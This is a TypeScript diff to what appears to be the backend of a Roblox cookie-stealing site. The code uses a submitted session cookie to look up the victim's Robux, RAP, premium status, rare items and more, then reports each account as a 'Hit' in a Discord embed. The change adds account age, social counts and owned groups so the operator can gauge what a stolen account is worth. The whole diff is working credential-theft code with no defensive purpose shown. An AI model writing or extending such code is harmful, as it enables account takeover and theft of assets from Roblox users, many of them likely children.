@@ -137,6 +137,12 @@ function json(b: unknown, status = 200) {
   });
 }
 
+interface GroupOwned {
+  name: string;
+  memberCount: number;
+  role: string;
+}
+
 interface RobloxInfo {
   id: number;
   name: string;
@@ -147,6 +153,13 @@ interface RobloxInfo {
   hasKorblox: boolean | null;
   hasHeadless: boolean | null;
   headshot: string | null;
+  createdAt: string | null;
+  accountAgeDays: number | null;
+  friendsCount: number | null;
+  followersCount: number | null;
+  followingCount: number | null;
+  ownedGroups: GroupOwned[];
+  totalGroups: number | null;
 }
 
 async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
@@ -158,14 +171,24 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
     if (!authRes.ok) return null;
     const auth = await authRes.json() as { id: number; name: string; displayName: string };
 
-    const [robux, premium, headshot, rap, hasKorblox, hasHeadless] = await Promise.all([
+    const [robux, premium, headshot, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo] = await Promise.all([
       fetchRobux(auth.id, cookieHeader),
       fetchPremium(auth.id, cookieHeader),
       fetchHeadshot(auth.id),
       fetchRap(auth.id),
       ownsBundle(auth.id, KORBLOX_BUNDLE_ID),
       ownsBundle(auth.id, HEADLESS_BUNDLE_ID),
+      fetchProfile(auth.id),
+      fetchCount(`https://friends.roblox.com/v1/users/${auth.id}/friends/count`, "count"),
+      fetchCount(`https://friends.roblox.com/v1/users/${auth.id}/followers/count`, "count"),
+      fetchCount(`https://friends.roblox.com/v1/users/${auth.id}/followings/count`, "count"),
+      fetchGroups(auth.id),
     ]);
+
+    const createdAt = profile?.created ?? null;
+    const accountAgeDays = createdAt
+      ? Math.floor((Date.now() - new Date(createdAt).getTime()) / (1000 * 60 * 60 * 24))
+      : null;
 
     return {
       id: auth.id,
@@ -177,11 +200,48 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       hasKorblox,
       hasHeadless,
       headshot,
+      createdAt,
+      accountAgeDays,
+      friendsCount,
+      followersCount,
+      followingCount,
+      ownedGroups: groupsInfo.owned,
+      totalGroups: groupsInfo.total,
     };
   } catch (e) {
     console.error("roblox lookup failed", e);
     return null;
   }
+}
+
+async function fetchProfile(userId: number): Promise<{ created: string } | null> {
+  try {
+    const r = await fetch(`https://users.roblox.com/v1/users/${userId}`);
+    if (!r.ok) return null;
+    return await r.json();
+  } catch { return null; }
+}
+
+async function fetchCount(url: string, key: string): Promise<number | null> {
+  try {
+    const r = await fetch(url);
+    if (!r.ok) return null;
+    const j = await r.json();
+    return j?.[key] ?? null;
+  } catch { return null; }
+}
+
+async function fetchGroups(userId: number): Promise<{ owned: GroupOwned[]; total: number | null }> {
+  try {
+    const r = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`);
+    if (!r.ok) return { owned: [], total: null };
+    const j = await r.json() as { data?: Array<{ group: { name: string; memberCount: number }; role: { name: string; rank: number } }> };
+    const all = j.data ?? [];
+    const owned = all
+      .filter((g) => g.role?.rank === 255 || /owner/i.test(g.role?.name ?? ""))
+      .map((g) => ({ name: g.group.name, memberCount: g.group.memberCount, role: g.role.name }));
+    return { owned, total: all.length };
+  } catch { return { owned: [], total: null }; }
 }
 
 async function fetchRobux(userId: number, cookieHeader: string): Promise<number | null> {
@@ -263,14 +323,53 @@ function buildDiscordPayload(opts: {
   }
 
   if (roblox) {
+    const ageStr = roblox.accountAgeDays !== null && roblox.createdAt
+      ? `${roblox.accountAgeDays.toLocaleString()} days (${new Date(roblox.createdAt).toISOString().slice(0, 10)})`
+      : "Unknown";
+
     mainFields.push(
       { name: "Roblox Username", value: `${roblox.name} (${roblox.displayName})`, inline: true },
       { name: "User ID", value: String(roblox.id), inline: true },
+      { name: "Account Age", value: ageStr, inline: true },
       { name: "Robux", value: roblox.robux !== null ? roblox.robux.toLocaleString() : "Unknown", inline: true },
       { name: "RAP", value: roblox.rap !== null ? roblox.rap.toLocaleString() : "Unknown", inline: true },
       { name: "Premium", value: roblox.premium === null ? "Unknown" : roblox.premium ? "Yes" : "No", inline: true },
+      { name: "Friends", value: roblox.friendsCount?.toLocaleString() ?? "Unknown", inline: true },
+      { name: "Followers", value: roblox.followersCount?.toLocaleString() ?? "Unknown", inline: true },
+      { name: "Following", value: roblox.followingCount?.toLocaleString() ?? "Unknown", inline: true },
       { name: "Korblox", value: roblox.hasKorblox === null ? "Unknown" : roblox.hasKorblox ? "✅ Yes" : "❌ No", inline: true },
       { name: "Headless", value: roblox.hasHeadless === null ? "Unknown" : roblox.hasHeadless ? "✅ Yes" : "❌ No", inline: true },
+      { name: "Total Groups", value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
+    );
+
+    // Owned groups — chunked to 1024 chars per field
+    if (roblox.ownedGroups.length > 0) {
+      const lines = roblox.ownedGroups.map(
+        (g) => `• **${g.name}** — ${g.memberCount.toLocaleString()} members`
+      );
+      const chunks: string[] = [];
+      let buf = "";
+      for (const line of lines) {
+        if ((buf + "\n" + line).length > 1024) {
+          chunks.push(buf);
+          buf = line;
+        } else {
+          buf = buf ? `${buf}\n${line}` : line;
+        }
+      }
+      if (buf) chunks.push(buf);
+      chunks.forEach((c, i) => {
+        mainFields.push({
+          name: chunks.length === 1 ? `👑 Owned Groups (${roblox.ownedGroups.length})` : `👑 Owned Groups (${i + 1}/${chunks.length})`,
+          value: c,
+          inline: false,
+        });
+      });
+    } else {
+      mainFields.push({ name: "👑 Owned Groups", value: "None", inline: false });
+    }
+
+    mainFields.push(
       { name: "Profile", value: `https://www.roblox.com/users/${roblox.id}/profile`, inline: false },
     );
   } else {
@@ -300,7 +399,7 @@ function buildDiscordPayload(opts: {
     embeds: [
       {
         title: roblox ? `Hit: ${roblox.name}` : "Submission Details",
-        color: 0x00d7dc,
+        color: 0xa855f7,
         thumbnail: roblox?.headshot ? { url: roblox.headshot } : undefined,
         fields: mainFields,
         footer: { text: `${siteName} Submission System` },
